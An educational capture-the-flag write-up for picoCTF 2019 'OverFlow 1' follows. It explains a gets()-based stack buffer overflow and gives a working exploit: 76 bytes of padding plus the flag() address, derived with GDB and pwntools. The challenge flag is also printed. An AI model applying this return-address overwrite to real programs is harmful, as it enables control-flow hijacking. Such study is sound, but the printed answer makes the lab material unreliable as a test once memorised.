<!doctype html><html lang=en class="sidebar-visible no-js ayu"><meta charset=utf-8><title>PicoCTF19 OverFlow 1 - Capture The Flag</title><meta charset=utf-8><meta name=description content><meta name=viewport content="width=device-width,initial-scale=1"><meta name=theme-color content="#ffffff"><link rel=icon href=../../favicon.svg><link rel="shortcut icon" href=../../favicon.png><link rel=stylesheet href=../../css/variables.css><link rel=stylesheet href=../../css/general.css><link rel=stylesheet href=../../css/chrome.css><link rel=stylesheet href=../../css/print.css media=print><link rel=stylesheet href=../../FontAwesome/css/font-awesome.css><link rel=stylesheet href=../../fonts/fonts.css><link rel=stylesheet href=../../highlight.css><link rel=stylesheet href=../../tomorrow-night.css><link rel=stylesheet href=../../ayu-highlight.css><link rel=stylesheet href=../../theme/mermaid.css><script>var path_to_root="../../",default_theme=window.matchMedia("(prefers-color-scheme: dark)").matches?"navy":"ayu"</script><script>var theme,sidebar;try{theme=localStorage.getItem('mdbook-theme'),sidebar=localStorage.getItem('mdbook-sidebar'),theme.startsWith('"')&&theme.endsWith('"')&&localStorage.setItem('mdbook-theme',theme.slice(1,theme.length-1)),sidebar.startsWith('"')&&sidebar.endsWith('"')&&localStorage.setItem('mdbook-sidebar',sidebar.slice(1,sidebar.length-1))}catch(a){}</script><script>var theme,html;try{theme=localStorage.getItem('mdbook-theme')}catch(a){}(theme===null||theme===void 0)&&(theme=default_theme),html=document.querySelector('html'),html.classList.remove('no-js'),html.classList.remove('ayu'),html.classList.add(theme),html.classList.add('js')</script><script>var html=document.querySelector('html'),sidebar='hidden';if(document.body.clientWidth>=1080){try{sidebar=localStorage.getItem('mdbook-sidebar')}catch(a){}sidebar=sidebar||'visible'}html.classList.remove('sidebar-visible'),html.classList.add("sidebar-"+sidebar)</script><nav id=sidebar class=sidebar aria-label="Table of contents"><div class=sidebar-scrollbox><ol class=chapter><li class="chapter-item expanded"><a href=../../index.html><strong aria-hidden=true>1.</strong> Introduction</a><li class="chapter-item expanded"><a href=../../MISCELLANEOUS.html><strong aria-hidden=true>2.</strong> Miscellaneous</a><li class="chapter-item expanded"><a href=../../ctf/index.html><strong aria-hidden=true>3.</strong> Capture The Flag</a><li><ol class=section><li class="chapter-item expanded"><a href=../../ctf/binary/index.html><strong aria-hidden=true>3.1.</strong> Binary Exploitation</a><li><ol class=section><li class="chapter-item expanded"><a href=../../ctf/binary/picoctf19-handy_shellcode.html><strong aria-hidden=true>3.1.1.</strong> PicoCTF19 Handy Shellcode</a><li class="chapter-item expanded"><a href=../../ctf/binary/picoctf19-overflow_0.html><strong aria-hidden=true>3.1.2.</strong> PicoCTF19 OverFlow 0</a><li class="chapter-item expanded"><a href=../../ctf/binary/picoctf19-overflow_1.html class=active><strong aria-hidden=true>3.1.3.</strong> PicoCTF19 OverFlow 1</a><li class="chapter-item expanded"><a href=../../ctf/binary/picoctf19-overflow_2.html><strong aria-hidden=true>3.1.4.</strong> PicoCTF19 OverFlow 2</a><li class="chapter-item expanded"><a href=../../ctf/binary/picoctf19-new_overflow_1.html><strong aria-hidden=true>3.1.5.</strong> PicoCTF19 NewOverFlow 1</a><li class="chapter-item expanded"><a href=../../ctf/binary/picoctf19-new_overflow_2.html><strong aria-hidden=true>3.1.6.</strong> PicoCTF19 NewOverFlow 2</a><li class="chapter-item expanded"><a href=../../ctf/binary/picoctf19-slippery_shellcode.html><strong aria-hidden=true>3.1.7.</strong> PicoCTF19 Slip-Shellcode</a><li class="chapter-item expanded"><a href=../../ctf/binary/picoctf19-stringzz.html><strong aria-hidden=true>3.1.8.</strong> PicoCTF19 Stringzz</a><li class="chapter-item expanded"><a href=../../ctf/binary/picoctf18-learn_libc.html><strong aria-hidden=true>3.1.9.</strong> PicoCTF18 learn-libc</a><li class="chapter-item expanded"><a href=../../ctf/binary/picoctf19-rop32.html><strong aria-hidden=true>3.1.10.</strong> PicoCTF19 rop32</a><li class="chapter-item expanded"><a href=../../ctf/binary/picoctf19-rop64.html><strong aria-hidden=true>3.1.11.</strong> PicoCTF19 rop64</a><li class="chapter-item expanded"><a href=../../ctf/binary/picoctf19-leap_frog.html><strong aria-hidden=true>3.1.12.</strong> PicoCTF19 leap-frog</a><li class="chapter-item expanded"><a href=../../ctf/binary/picoctf19-canary.html><strong aria-hidden=true>3.1.13.</strong> PicoCTF19 CanaRy</a></ol><li class="chapter-item expanded"><a href=../../ctf/crypto/index.html><strong aria-hidden=true>3.2.</strong> Crypto</a><li><ol class=section><li class="chapter-item expanded"><a href=../../ctf/crypto/hackcon18-caesar.html><strong aria-hidden=true>3.2.1.</strong> Hackcon2018 Caesar Salad</a><li class="chapter-item expanded"><a href=../../ctf/crypto/hackcon18-salad.html><strong aria-hidden=true>3.2.2.</strong> Hackcon2018 Salad Up.</a><li class="chapter-item expanded"><a href=../../ctf/crypto/icectf18q-garfield.html><strong aria-hidden=true>3.2.3.</strong> IceCTF18Q Garfield</a><li class="chapter-item expanded"><a href=../../ctf/crypto/tjctf18-classic.html><strong aria-hidden=true>3.2.4.</strong> TJCTF18 Classic</a><li class="chapter-item expanded"><a href=../../ctf/crypto/picoctf19-numbers.html><strong aria-hidden=true>3.2.5.</strong> PicoCTF19 The Numbers</a><li class="chapter-item expanded"><a href=../../ctf/crypto/picoctf19-caesar.html><strong aria-hidden=true>3.2.6.</strong> PicoCTF19 Caesar</a><li class="chapter-item expanded"><a href=../../ctf/crypto/picoctf19-wavesoverlambda.html><strong aria-hidden=true>3.2.7.</strong> PicoCTF19 Waves Lambda</a><li class="chapter-item expanded"><a href=../../ctf/crypto/picoctf19-lacifrede.html><strong aria-hidden=true>3.2.8.</strong> PicoCTF19 La Cifra De</a><li class="chapter-item expanded"><a href=../../ctf/crypto/picoctf19-rsapopquiz.html><strong aria-hidden=true>3.2.9.</strong> PicoCTF19 RSA Pop Quiz</a><li class="chapter-item expanded"><a href=../../ctf/crypto/picoctf19-minirsa.html><strong aria-hidden=true>3.2.10.</strong> PicoCTF19 miniRSA</a><li class="chapter-item expanded"><a href=../../ctf/crypto/picoctf19-b00tl3gRSA2.html><strong aria-hidden=true>3.2.11.</strong> PicoCTF19 b00tl3gRSA2</a><li class="chapter-item expanded"><a href=../../ctf/crypto/picoctf19-b00tl3gRSA3.html><strong aria-hidden=true>3.2.12.</strong> PicoCTF19 b00tl3gRSA3</a><li class="chapter-item expanded"><a href=../../ctf/crypto/picoctf19-john_pollard.html><strong aria-hidden=true>3.2.13.</strong> PicoCTF19 john_pollard</a><li class="chapter-item expanded"><a href=../../ctf/crypto/picoctf19-aesabc.html><strong aria-hidden=true>3.2.14.</strong> PicoCTF19 AES-ABC</a><li class="chapter-item expanded"><a href=../../ctf/crypto/auctf20-extraordinary.html><strong aria-hidden=true>3.2.15.</strong> AUCTF20 Extraordinary</a></ol><li class="chapter-item expanded"><a href=../../ctf/forensics/index.html><strong aria-hidden=true>3.3.</strong> Forensics</a><li><ol class=section><li class="chapter-item expanded"><a href=../../ctf/forensics/aeroctf20-drawings.html><strong aria-hidden=true>3.3.1.</strong> AeroCTF20 Drawings</a><li class="chapter-item expanded"><a href=../../ctf/forensics/picoctf19-garden.html><strong aria-hidden=true>3.3.2.</strong> PicoCTF19 Garden</a><li class="chapter-item expanded"><a href=../../ctf/forensics/picoctf19-unzip.html><strong aria-hidden=true>3.3.3.</strong> PicoCTF19 Unzip</a><li class="chapter-item expanded"><a href=../../ctf/forensics/picoctf19-so-meta.html><strong aria-hidden=true>3.3.4.</strong> PicoCTF19 So Meta</a><li class="chapter-item expanded"><a href=../../ctf/forensics/picoctf19-what-lies-within.html><strong aria-hidden=true>3.3.5.</strong> PicoCTF19 Lies Within</a><li class="chapter-item expanded"><a href=../../ctf/forensics/picoctf19-extensions.html><strong aria-hidden=true>3.3.6.</strong> PicoCTF19 Extensions</a><li class="chapter-item expanded"><a href=../../ctf/forensics/picoctf19-shark-on-wire-1.html><strong aria-hidden=true>3.3.7.</strong> PicoCTF19 Shark Wire</a><li class="chapter-item expanded"><a href=../../ctf/forensics/picoctf19-whitepages.html><strong aria-hidden=true>3.3.8.</strong> PicoCTF19 WhitePages</a><li class="chapter-item expanded"><a href=../../ctf/forensics/picoctf19-like1000.html><strong aria-hidden=true>3.3.9.</strong> PicoCTF19 like1000</a></ol><li class="chapter-item expanded"><a href=../../ctf/misc/index.html><strong aria-hidden=true>3.4.</strong> Misc</a><li><ol class=section><li class="chapter-item expanded"><a href=../../ctf/misc/auctf20-bash.html><strong aria-hidden=true>3.4.1.</strong> AUCTF20 Bash</a><li class="chapter-item expanded"><a href=../../ctf/misc/corelightctf20.html><strong aria-hidden=true>3.4.2.</strong> CorelightCTF20</a></ol><li class="chapter-item expanded"><a href=../../ctf/reversing/index.html><strong aria-hidden=true>3.5.</strong> Reversing</a><li><ol class=section><li class="chapter-item expanded"><a href=../../ctf/reversing/auctf20-mrgame.html><strong aria-hidden=true>3.5.1.</strong> AUCTF20 Mr. Game</a></ol><li class="chapter-item expanded"><a href=../../ctf/web/index.html><strong aria-hidden=true>3.6.</strong> Web</a><li><ol class=section><li class="chapter-item expanded"><a href=../../ctf/web/seccon19-web_search.html><strong aria-hidden=true>3.6.1.</strong> SECCON19 Web Search</a><li class="chapter-item expanded"><a href=../../ctf/web/tmctf19-finals-containers.html><strong aria-hidden=true>3.6.2.</strong> TMCTF19F Container</a><li class="chapter-item expanded"><a href=../../ctf/web/insctf20-quals-lowdeep.html><strong aria-hidden=true>3.6.3.</strong> INSCTF20Q LowDeep</a></ol></ol></ol></div><div id=sidebar-resize-handle class=sidebar-resize-handle></div></nav><div id=page-wrapper class=page-wrapper><div class=page><div id=menu-bar-hover-placeholder></div><div id=menu-bar class="menu-bar sticky bordered"><div class=left-buttons><button id=sidebar-toggle class=icon-button type=button title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls=sidebar>
<i class="fa fa-bars"></i></button>
<button id=theme-toggle class=icon-button type=button title="Change theme" aria-label="Change theme" aria-haspopup=true aria-expanded=false aria-controls=theme-list>
<i class="fa fa-paint-brush"></i></button><ul id=theme-list class=theme-popup aria-label=Themes role=menu><li role=none><button role=menuitem class=theme id=light>Light</button><li role=none><button role=menuitem class=theme id=rust>Rust</button><li role=none><button role=menuitem class=theme id=coal>Coal</button><li role=none><button role=menuitem class=theme id=navy>Navy</button><li role=none><button role=menuitem class=theme id=ayu>Ayu (default)</button></ul><button id=search-toggle class=icon-button type=button title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded=false aria-keyshortcuts=S aria-controls=searchbar>
<i class="fa fa-search"></i></button></div><h1 class=menu-title>Capture The Flag</h1><div class=right-buttons><a href=../../print.html title="Print this book" aria-label="Print this book"><i id=print-button class="fa fa-print"></i></a><a href=https://github.com/sgama/ctf.samsongama.com title="Git repository" aria-label="Git repository"><i id=git-repository-button class="fa fa-github"></i></a></div></div><div id=search-wrapper class=hidden><form id=searchbar-outer class=searchbar-outer><input type=search name=search id=searchbar name=searchbar placeholder="Search this book ..." aria-controls=searchresults-outer aria-describedby=searchresults-header></form><div id=searchresults-outer class="searchresults-outer hidden"><div id=searchresults-header class=searchresults-header></div><ul id=searchresults></ul></div></div><script>document.getElementById('sidebar-toggle').setAttribute('aria-expanded',sidebar==='visible'),document.getElementById('sidebar').setAttribute('aria-hidden',sidebar!=='visible'),Array.from(document.querySelectorAll('#sidebar a')).forEach(function(a){a.setAttribute('tabIndex',sidebar==='visible'?0:-1)})</script><div id=content class=content><main><h1><a class=header href=#picoctf19-overflow-1 id=picoctf19-overflow-1>PicoCTF19 OverFlow 1</a></h1><h2><a class=header href=#challenge id=challenge>Challenge</a></h2><p>You beat the first overflow challenge. Now overflow the buffer and change the return address to the flag function in this <a href=https://2019shell1.picoctf.com/static/8b7521756bddb2cce5c14fd2b60cd354/vuln>program</a>? You can find it in /problems/overflow-1 on the shell server. <a href=https://2019shell1.picoctf.com/static/8b7521756bddb2cce5c14fd2b60cd354/vuln.c>Source</a>.<h2><a class=header href=#hints id=hints>Hints</a></h2><p>Take control that return address<p>Make sure your address is in Little Endian.<h2><a class=header href=#solution id=solution>Solution</a></h2><p>Let's view that directory:<pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-1$ ls -al
total 92
drwxr-xr-x   2 root       root          4096 Sep 28 21:51 .
drwxr-x--x 684 root       root         69632 Oct 10 18:02 ..
-r--r-----   1 hacksports overflow-1_3    42 Sep 28 21:51 flag.txt
-rwxr-sr-x   1 hacksports overflow-1_3  7532 Sep 28 21:51 vuln
-rw-rw-r--   1 hacksports hacksports     742 Sep 28 21:51 vuln.c
</code></pre><p>Let's view <code>vuln.c</code><pre><code>samson@pico-2019-shell1:/problems/overflow-1$ cat vuln.c
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;
#include &quot;asm.h&quot;

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen(&quot;flag.txt&quot;,&quot;r&quot;);
  if (f == NULL) {
    printf(&quot;Flag File is Missing. please contact an Admin if you are running this on the shell server.\n&quot;);
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);

  printf(&quot;Woah, were jumping to 0x%x !\n&quot;, get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts(&quot;Give me a string and lets see what happens: &quot;);
  vuln();
  return 0;
}
</code></pre><p>As expected, there is a function that prints the flag but it's never explicitly called.<p>The program takes a string and attempts to jump to that address. But hey, since this is an overflow question let's just give the program a bunch of garbage and see what happens.<pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-1$ ./vuln
Give me a string and lets see what happens: 

Woah, were jumping to 0x8048705 !
samson@pico-2019-shell1:/problems/overflow-1$ ./vuln
Give me a string and lets see what happens: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Woah, were jumping to 0x41414141 !
Segmentation fault (core dumped)
</code></pre><p>Hmm: <code>0x41414141</code>. If you're familiar with the <a href=https://en.wikipedia.org/wiki/ASCII>ASCII Table</a>, <code>A</code> is <code>41</code> in hexadecimal.<p>So it looks like we overwrite some instructions with our input. Let's find the minimal amount of <code>A</code>'s required to change the jump address.<pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-1$ echo $(python -c &quot;print 'A'*77&quot;) | ./vuln
Give me a string and lets see what happens:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Woah, were jumping to 0x8040041 !
Segmentation fault (core dumped)
</code></pre><p>Notice how with no input the value is <code>0x8048705</code> but with 77 <code>A</code>'s, it's <code>0x8040041</code>.<p>You can see the first <code>41</code> is at the end. This is due to <code>x86_64</code> working in little endian mode.<p>So basically this overflow seems like we might have to overwrite the address with the address of the flag and in order to do that we first need to figure out which memory address the flag function is located at and we can do that with GDB.<pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-1$ gdb ./vuln 
GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git
... &lt;redacted&gt;
Reading symbols from ./vuln...(no debugging symbols found)...done.
(gdb) x flag
0x80485e6 &lt;flag&gt;:       0x53e58955
(gdb) q
</code></pre><p>There it is at memory address <code>0x80485e6</code>.<p>Let's try working that into the address:<pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-1$ echo $(python -c &quot;print 'A'*77+'\xe6'&quot;)  | ./vuln
Give me a string and lets see what happens: 
Woah, were jumping to 0x800e641 !
Segmentation fault (core dumped)
samson@pico-2019-shell1:/problems/overflow-1$ echo $(python -c &quot;print 'A'*76+'\xe6'&quot;) | ./vuln
Give me a string and lets see what happens: 
Woah, were jumping to 0x80400e6 !
Segmentation fault (core dumped)
samson@pico-2019-shell1:/problems/overflow-1$ echo $(python -c &quot;print 'A'*76+'\xe6\x85\x04\x08'&quot;) | ./vuln
Give me a string and lets see what happens: 
Woah, were jumping to 0x80485e6 !
picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5a21b59fb}Segmentation fault (core dumped)
</code></pre><h2><a class=header href=#more-detailed-explanation id=more-detailed-explanation>More detailed explanation</a></h2><p>So why did that work? We won't have a nice function that tells us the return address all the time.<p>In x86 assembly, the memory address of where a program is returning to is held in the <code>ebp</code> register, otherwise known as the base pointer. So let's try to see if we can match the register value to what the function prints out for us<pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-1$ ./vuln 
Give me a string and lets see what happens: 
picoCTF
Woah, were jumping to 0x8048705 !
samson@pico-2019-shell1:/problems/overflow-1$ gdb ./vuln
GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git
... &lt;redacted&gt;

(gdb) r &lt; &lt;(python -c 'print(&quot;A&quot;*64)')
Starting program: /problems/overflow-1/vuln &lt; &lt;(python -c 'print(&quot;A&quot;*64)')
Give me a string and lets see what happens: 
Woah, were jumping to 0x8048705 !
[Inferior 1 (process 2891586) exited normally]

(gdb) r &lt; &lt;(python -c 'print(&quot;A&quot;*76+&quot;\xe6\x85\x04\x08&quot;)')
Starting program: /problems/overflow-1/vuln &lt; &lt;(python -c 'print(&quot;A&quot;*76+&quot;\xe6\x85\x04\x08&quot;)')
Give me a string and lets see what happens: 
Woah, were jumping to 0x80485e6 !
Flag File is Missing. please contact an Admin if you are running this on the shell server.
[Inferior 1 (process 2891439) exited normally]
</code></pre><p>Just verifying we can send in input through GDB.<pre><code class=language-bash>(gdb) disas vuln
Dump of assembler code for function vuln:
   0x0804865f &lt;+0&gt;:     push   %ebp
   0x08048660 &lt;+1&gt;:     mov    %esp,%ebp
   0x08048662 &lt;+3&gt;:     push   %ebx
   0x08048663 &lt;+4&gt;:     sub    $0x44,%esp
   0x08048666 &lt;+7&gt;:     call   0x8048520 &lt;__x86.get_pc_thunk.bx&gt;
   0x0804866b &lt;+12&gt;:    add    $0x1995,%ebx
   0x08048671 &lt;+18&gt;:    sub    $0xc,%esp
   0x08048674 &lt;+21&gt;:    lea    -0x48(%ebp),%eax
   0x08048677 &lt;+24&gt;:    push   %eax
   0x08048678 &lt;+25&gt;:    call   0x8048430 &lt;gets@plt&gt;
   0x0804867d &lt;+30&gt;:    add    $0x10,%esp
   0x08048680 &lt;+33&gt;:    call   0x8048714 &lt;get_return_address&gt;
   0x08048685 &lt;+38&gt;:    sub    $0x8,%esp
   0x08048688 &lt;+41&gt;:    push   %eax
   0x08048689 &lt;+42&gt;:    lea    -0x17f9(%ebx),%eax
   0x0804868f &lt;+48&gt;:    push   %eax
   0x08048690 &lt;+49&gt;:    call   0x8048420 &lt;printf@plt&gt;
   0x08048695 &lt;+54&gt;:    add    $0x10,%esp
   0x08048698 &lt;+57&gt;:    nop
   0x08048699 &lt;+58&gt;:    mov    -0x4(%ebp),%ebx
   0x0804869c &lt;+61&gt;:    leave  
   0x0804869d &lt;+62&gt;:    ret    
End of assembler dump.
</code></pre><p>We know the <code>call 0x8048430 &lt;gets@plt></code> is where the assembly code gets user input so lets view the important bits of the stack change as we step through it after setting a breakpoint right before it.<p>How do we know <code>gets()</code> is the function that's vulnerable? Well try running <code>man gets</code>. Here's an excerpt:<pre><code>GETS(3)    Linux Programmer's Manual    GETS(3)

NAME
  gets - get a string from standard input (DEPRECATED)

SYNOPSIS
  #include &lt;stdio.h&gt;

  char *gets(char *s);

DESCRIPTION
  Never use this function.
  gets() reads a line from stdin into the buffer pointed to by s until either a terminating newline or EOF, which replaces with a null byte ('\0'). No check for buffer overrun is performed (see BUGS below).

RETURN VALUE
  gets() returns s on success, and NULL on error or when end of file occurs while no characters have been read. However, given the lack of buffer overrun checking, there can be no guarantees that the function will even return.
</code></pre><pre><code class=language-bash>(gdb) b* 0x08048678
Breakpoint 1 at 0x8048678
(gdb) r &lt; &lt;(python -c 'print(&quot;A&quot;*76+&quot;\xe6\x85\x04\x08&quot;)')
Starting program: /problems/overflow-1/vuln &lt; &lt;(python -c 'print(&quot;A&quot;*76+&quot;\xe6\x85\x04\x08&quot;)')
Give me a string and lets see what happens: 

Breakpoint 1, 0x08048678 in vuln ()
(gdb) info frame
Stack level 0, frame at 0xffde0df0:
 eip = 0x8048678 in vuln; saved eip = 0x8048705
 called by frame at 0xffde0e20
 Arglist at 0xffde0de8, args: 
 Locals at 0xffde0de8, Previous frame's sp is 0xffde0df0
 Saved registers:
  ebx at 0xffde0de4, ebp at 0xffde0de8, eip at 0xffde0dec
</code></pre><p>Note the output: <code>saved eip = 0x8048705</code>. As we know the EIP is the instruction pointer that the allows to the CPU to remember where to jump to after returning from a function.<p>Let's step through with the <code>next instruction</code> command and watch what happens after the program receives our input.<pre><code class=language-bash>(gdb) ni
0x0804867d in vuln ()
(gdb) i f
Stack level 0, frame at 0xffde0df0:
 eip = 0x804867d in vuln; saved eip = 0x80485e6
 called by frame at 0x41414149
 Arglist at 0xffde0de8, args: 
 Locals at 0xffde0de8, Previous frame's sp is 0xffde0df0
 Saved registers:
  ebx at 0xffde0de4, ebp at 0xffde0de8, eip at 0xffde0dec
</code></pre><p>There we go. We overwrote the old value of the eip and now the program should technically jump wherever we want, in our case the address of the flag.<h2><a class=header href=#flag id=flag>Flag</a></h2><p><code>picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5a21b59fb}</code><h2><a class=header href=#alternative-solution---pwntools id=alternative-solution---pwntools>Alternative Solution - PwnTools</a></h2><p>To recap, <code>vuln</code> allocates a buffer of size <code>64</code> on the stack and then uses <code>gets</code> a vulnerable function to read from it.<p>The first step is to calculate the amount of padding required from the beginning of the buffer all the way to the return address on the stack.<p>Luckily for us, the program prints the return address where the program will be jumping back to. Let's use PwnTools <code>cyclic</code> module this.<p>Visit this page to learn more on how to use it: <a href=https://docs.pwntools.com/en/stable/util/cyclic.html>https://docs.pwntools.com/en/stable/util/cyclic.html</a><pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-1$ cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
samson@pico-2019-shell1:/problems/overflow-1$ cyclic 100 | ./vuln
Give me a string and lets see what happens: 
Woah, were jumping to 0x61616174 !
Segmentation fault (core dumped)
</code></pre><p><code>61</code>, <code>61</code>, <code>61</code>, <code>74</code> - map to <code>a</code>, <code>a</code>, <code>a</code>, <code>t</code>.<p>I see this pattern in that long string, but I really don't want to count it.<pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-1$ cyclic -l 0x61616174
76
</code></pre><p>So we need 76 bytes of padding and then the address of the <code>flag()</code> function.<pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-1$ objdump -t vuln | grep flag
080485e6 g     F .text  00000079              flag
</code></pre><pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-1$ python -c &quot;from pwn import *; print('A'*76 + p32(0x080485e6))&quot; | ./vuln
Give me a string and lets see what happens: 
Woah, were jumping to 0x80485e6 !
picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5a21b59fb}Segmentation fault (core dumped)
</code></pre></main><nav class=nav-wrapper aria-label="Page navigation"><a rel=prev href=../../ctf/binary/picoctf19-overflow_0.html class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts=Left><i class="fa fa-angle-left"></i></a><a rel=next href=../../ctf/binary/picoctf19-overflow_2.html class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts=Right><i class="fa fa-angle-right"></i></a><div style=clear:both></div></nav></div></div><nav class=nav-wide-wrapper aria-label="Page navigation"><a rel=prev href=../../ctf/binary/picoctf19-overflow_0.html class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts=Left><i class="fa fa-angle-left"></i></a><a rel=next href=../../ctf/binary/picoctf19-overflow_2.html class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts=Right><i class="fa fa-angle-right"></i></a></nav></div><script>window.playground_copyable=!0</script><script src=../../elasticlunr.min.js></script><script src=../../mark.min.js></script><script src=../../searcher.js></script><script src=../../clipboard.min.js></script><script src=../../highlight.js></script><script src=../../book.js></script><script src=../../theme/mermaid.js></script>